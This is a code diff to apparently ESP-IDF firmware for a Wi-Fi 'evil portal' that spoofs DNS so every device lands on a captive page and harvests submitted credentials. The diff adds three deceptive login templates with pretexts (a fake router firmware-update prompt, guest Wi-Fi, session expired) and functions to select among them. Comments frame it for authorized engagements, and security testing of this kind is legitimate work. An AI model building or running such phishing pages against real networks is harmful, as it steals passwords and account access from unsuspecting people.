@@ -40,9 +40,11 @@ typedef struct {
 } ep_cred_t;
 static ep_cred_t s_creds[EP_MAX_CREDS];
 
-// Generic, unbranded "network sign-in" page — served for every request (captive-portal catch-all). Posts
-// credentials to /login. Deliberately impersonates no specific brand.
-static const char PORTAL_HTML[] =
+// Generic, UNBRANDED captive-portal templates — each served for every request (captive-portal catch-all) and
+// posts credentials to /login. They impersonate no specific brand; a brand-specific page for an authorized
+// engagement is the operator's to add (drop HTML using the same username/password fields). The raw files
+// live in templates/portals/ for the operator + the Cyber Controller template feature.
+static const char HTML_NETLOGIN[] =
     "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
     "<title>Network Login</title></head>"
     "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
@@ -52,6 +54,50 @@ static const char PORTAL_HTML[] =
     "<p><input name=password type=password placeholder=Password style=\"width:100%;padding:8px\"></p>"
     "<p><button type=submit style=\"width:100%;padding:10px\">Sign in</button></p>"
     "</form></body></html>";
+static const char HTML_ROUTER[] =
+    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
+    "<title>Router Administration</title></head>"
+    "<body style=\"font-family:sans-serif;max-width:380px;margin:40px auto\">"
+    "<h2>Router Administration</h2><p>A firmware update is available. Sign in as administrator to apply it.</p>"
+    "<form method=POST action=\"/login\">"
+    "<p><input name=username placeholder=\"Administrator username\" style=\"width:100%;padding:8px\"></p>"
+    "<p><input name=password type=password placeholder=\"Administrator password\" style=\"width:100%;padding:8px\"></p>"
+    "<p><button type=submit style=\"width:100%;padding:10px\">Sign in</button></p>"
+    "</form></body></html>";
+static const char HTML_GUEST[] =
+    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
+    "<title>Guest Wi-Fi</title></head>"
+    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
+    "<h2>Guest Wi-Fi access</h2><p>Enter your email and the access code from reception.</p>"
+    "<form method=POST action=\"/login\">"
+    "<p><input name=username type=email placeholder=\"Email address\" style=\"width:100%;padding:8px\"></p>"
+    "<p><input name=password placeholder=\"Access code\" style=\"width:100%;padding:8px\"></p>"
+    "<p><button type=submit style=\"width:100%;padding:10px\">Connect</button></p>"
+    "</form></body></html>";
+static const char HTML_REAUTH[] =
+    "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\">"
+    "<title>Session Expired</title></head>"
+    "<body style=\"font-family:sans-serif;max-width:360px;margin:40px auto\">"
+    "<h2>Your session has expired</h2><p>Please re-enter your credentials to continue.</p>"
+    "<form method=POST action=\"/login\">"
+    "<p><input name=username type=email placeholder=Email style=\"width:100%;padding:8px\"></p>"
+    "<p><input name=password type=password placeholder=Password style=\"width:100%;padding:8px\"></p>"
+    "<p><button type=submit style=\"width:100%;padding:10px\">Continue</button></p>"
+    "</form></body></html>";
+
+typedef struct {
+    const char *id;
+    const char *name;
+    const char *html;
+} ep_template_t;
+static const ep_template_t TEMPLATES[] = {
+    {"netlogin", "Network sign-in",       HTML_NETLOGIN},
+    {"router",   "Router administration", HTML_ROUTER},
+    {"guest",    "Guest Wi-Fi",           HTML_GUEST},
+    {"reauth",   "Session expired",       HTML_REAUTH},
+};
+#define EP_TEMPLATE_N (sizeof(TEMPLATES) / sizeof(TEMPLATES[0]))
+static size_t s_template;  // index into TEMPLATES; default 0 (netlogin)
 
 static const char DONE_HTML[] =
     "<!DOCTYPE html><html><head><meta name=viewport content=\"width=device-width,initial-scale=1\"></head>"
@@ -141,6 +187,27 @@ void lxveos_evilportal_creds_each(lxveos_evilportal_cred_cb cb)
     }
 }
 
+bool lxveos_evilportal_template_set(const char *id)
+{
+    for (size_t i = 0; i < EP_TEMPLATE_N; i++) {
+        if (strcmp(TEMPLATES[i].id, id) == 0) {
+            s_template = i;
+            return true;
+        }
+    }
+    return false;
+}
+
+void lxveos_evilportal_templates_each(lxveos_evilportal_tmpl_cb cb)
+{
+    if (cb == NULL) {
+        return;
+    }
+    for (size_t i = 0; i < EP_TEMPLATE_N; i++) {
+        cb(TEMPLATES[i].id, TEMPLATES[i].name, i == s_template);
+    }
+}
+
 // Minimal DNS responder: answer every query with the AP IP (192.168.4.1) so a client's captive-portal
 // detection resolves to us and auto-opens the login page. Built like the ESP-IDF captive-portal example;
 // stop() calls shutdown() on the socket to break the blocking recvfrom so this task exits.
@@ -210,11 +277,11 @@ static void dns_task(void *arg)
     vTaskDelete(NULL);
 }
 
-// Any GET -> the login page (captive-portal catch-all via the wildcard match fn).
+// Any GET -> the selected login page (captive-portal catch-all via the wildcard match fn).
 static esp_err_t portal_get_handler(httpd_req_t *req)
 {
     httpd_resp_set_type(req, "text/html");
-    return httpd_resp_send(req, PORTAL_HTML, HTTPD_RESP_USE_STRLEN);
+    return httpd_resp_send(req, TEMPLATES[s_template].html, HTTPD_RESP_USE_STRLEN);
 }
 
 // POST /login -> capture the submitted credentials (logged + counted), then show a benign "connecting" page.
